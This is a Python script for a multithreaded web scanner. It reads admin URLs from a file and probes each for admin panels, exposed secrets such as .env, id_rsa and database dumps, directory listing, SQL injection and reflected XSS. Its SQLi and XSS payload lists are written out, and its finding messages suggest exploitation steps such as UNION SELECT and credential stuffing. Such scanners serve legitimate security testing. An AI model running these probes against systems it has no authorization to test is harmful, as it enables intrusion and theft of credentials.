import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
import threading
from queue import Queue
import time

# Ignore SSL warnings (optional)
requests.packages.urllib3.disable_warnings()

NUM_THREADS = 5

# Common admin panel paths to check
COMMON_ADMIN_PATHS = [
    "/admin",
    "/administrator",
    "/admin/login",
    "/admin.php",
    "/login",
    "/admin/login.php",
    "/admin_area/",
    "/cpanel",
]

# Sensitive files often leaked on servers
SENSITIVE_FILES = [
    "backup.zip",
    "backup.tar.gz",
    ".git/config",
    ".env",
    "config.php",
    "config.inc.php",
    "database.sql",
    "dump.sql",
    "id_rsa",
]

# Payloads for basic SQL Injection test on URL parameters
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' -- ",
]

# Payloads for XSS testing on URL parameters
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><svg/onload=alert(1)>",
]

print_lock = threading.Lock()

def safe_print(*args, **kwargs):
    """Thread-safe print."""
    with print_lock:
        print(*args, **kwargs)

def check_url(url):
    """Check if URL is reachable and return status code and content."""
    try:
        resp = requests.get(url, timeout=10, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, None

def check_directory_listing(url):
    """
    Checks if directory listing is enabled by looking for typical directory index HTML.
    """
    status, content = check_url(url)
    if status == 200 and content:
        # Simple heuristic: directory listing pages usually contain "Index of /"
        if "Index of /" in content or "Parent Directory" in content:
            return True
    return False

def test_sensitive_files(base_url):
    """
    Check for presence of common sensitive files like backups, config files.
    """
    findings = []
    for filename in SENSITIVE_FILES:
        url = urljoin(base_url, filename)
        status, content = check_url(url)
        if status == 200:
            findings.append({
                "url": url,
                "issue": "Sensitive file exposed",
                "explanation": (
                    f"The file '{filename}' is accessible. It may contain secrets like "
                    "database credentials or source code, which can be used to fully compromise the site."
                )
            })
    return findings

def test_common_admin_paths(base_url):
    """
    Check common admin paths for accessibility.
    """
    findings = []
    for path in COMMON_ADMIN_PATHS:
        url = urljoin(base_url, path)
        status, content = check_url(url)
        if status and status < 400:
            findings.append({
                "url": url,
                "issue": "Admin page found",
                "explanation": (
                    f"An admin panel is found at '{path}'. This page may have weak authentication "
                    "or other vulnerabilities."
                )
            })
    return findings

def test_sql_injection(url):
    """
    Test SQL Injection vulnerability on URL parameters by injecting payloads.
    """
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return findings  # No parameters to test

    for param in params:
        for payload in SQLI_PAYLOADS:
            # Create new query with payload in current param
            new_params = params.copy()
            new_params[param] = payload
            new_query = urlencode(new_params, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))
            status, content = check_url(new_url)
            if status is None:
                continue
            # Basic heuristic: server errors or SQL error messages may indicate vuln
            errors = ["sql syntax", "mysql", "syntax error", "unclosed quotation mark"]
            content_lower = content.lower() if content else ""
            if status >= 500 or any(err in content_lower for err in errors):
                findings.append({
                    "url": new_url,
                    "issue": "Possible SQL Injection",
                    "explanation": (
                        f"Injecting payload '{payload}' into parameter '{param}' caused a server error "
                        "or database error message. This suggests a SQL injection vulnerability.\n"
                        "Exploitation: You can try bypassing login forms or extracting data via UNION SELECT or blind SQLi."
                    )
                })
    return findings

def test_xss(url):
    """
    Test Cross-Site Scripting vulnerability on URL parameters.
    """
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return findings

    for param in params:
        for payload in XSS_PAYLOADS:
            new_params = params.copy()
            new_params[param] = payload
            new_query = urlencode(new_params, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))
            status, content = check_url(new_url)
            if status is None or content is None:
                continue
            # Check if payload is reflected in response content
            if payload in content:
                findings.append({
                    "url": new_url,
                    "issue": "Possible XSS Vulnerability",
                    "explanation": (
                        f"The payload '{payload}' is reflected unescaped in the page response in parameter '{param}'.\n"
                        "Exploitation: This can allow attackers to run arbitrary JavaScript in the admin's browser, "
                        "leading to session hijacking or full admin takeover."
                    )
                })
    return findings

def test_weak_login_page(url):
    """
    Check if the URL is a login page by looking for form and common keywords.
    """
    findings = []
    status, content = check_url(url)
    if status is None or content is None:
        return findings

    # Heuristics to detect login forms
    keywords = ["login", "password", "username", "sign in"]
    form_present = "<form" in content.lower()
    keyword_found = any(kw in content.lower() for kw in keywords)

    if form_present and keyword_found:
        findings.append({
            "url": url,
            "issue": "Login page detected",
            "explanation": (
                "The page contains a login form. This could be tested for weak/default passwords "
                "or credential stuffing attacks. Exploiting weak logins can grant admin access."
            )
        })

    return findings

def scan_admin_url(url):
    """
    Perform all admin-related vulnerability checks on a given URL.
    """
    safe_print(f"\n[*] Scanning admin URL: {url}")

    all_findings = []

    # 1. Check reachability
    status, _ = check_url(url)
    if status is None:
        safe_print(f"[!] {url} is not reachable.")
        return all_findings
    else:
        safe_print(f"[+] {url} is reachable with status code {status}")

    # 2. Check common admin paths (subpaths)
    admin_path_findings = test_common_admin_paths(url)
    all_findings.extend(admin_path_findings)

    # 3. Check for sensitive files exposed
    sensitive_findings = test_sensitive_files(url)
    all_findings.extend(sensitive_findings)

    # 4. Check for directory listing enabled
    if check_directory_listing(url):
        all_findings.append({
            "url": url,
            "issue": "Directory Listing Enabled",
            "explanation": (
                "The web server allows directory listing. Attackers can browse all files and directories, "
                "which might expose sensitive files."
            )
        })

    # 5. Test for SQL Injection on URL params
    sqli_findings = test_sql_injection(url)
    all_findings.extend(sqli_findings)

    # 6. Test for XSS on URL params
    xss_findings = test_xss(url)
    all_findings.extend(xss_findings)

    # 7. Detect if URL is login page
    login_findings = test_weak_login_page(url)
    all_findings.extend(login_findings)

    # Report findings
    if all_findings:
        safe_print(f"[!] Potential vulnerabilities found on {url}:")
        for f in all_findings:
            safe_print(f"  - Issue: {f['issue']}")
            safe_print(f"    URL: {f['url']}")
            safe_print(f"    Explanation: {f['explanation']}\n")
    else:
        safe_print(f"[+] No obvious vulnerabilities found on {url}.")

    return all_findings


# --- Multithreading to scan multiple admin URLs concurrently ---

def worker(queue, results):
    while True:
        url = queue.get()
        if url is None:
            break
        findings = scan_admin_url(url)
        if findings:
            with print_lock:
                results.extend(findings)
        queue.task_done()

def main():
    # Read admin URLs from file
    input_file = "admin.txt"
    try:
        with open(input_file, "r") as f:
            urls = [line.strip() for line in f if line.strip()]
    except Exception as d:
        #print(f"[!] File {input_file} not found. Create it and put one admin URL per line.")
        print(d)
        return

    q = Queue()
    results = []

    for url in urls:
        q.put(url)

    threads = []
    for _ in range(NUM_THREADS):
        t = threading.Thread(target=worker, args=(q, results))
        t.start()
        threads.append(t)

    q.join()

    for _ in range(NUM_THREADS):
        q.put(None)

    for t in threads:
        t.join()

    # Save results report
    if results:
        with open("admin_vuln_report.txt", "w") as f:
            for res in results:
                f.write(f"Issue: {res['issue']}\n")
                f.write(f"URL: {res['url']}\n")
                f.write(f"Explanation: {res['explanation']}\n")
                f.write("="*60 + "\n")
        print(f"\n[+] Scan complete. Vulnerabilities saved in admin_vuln_report.txt")
    else:
        print("\n[+] Scan complete. No vulnerabilities found.")

if __name__ == "__main__":
    main()
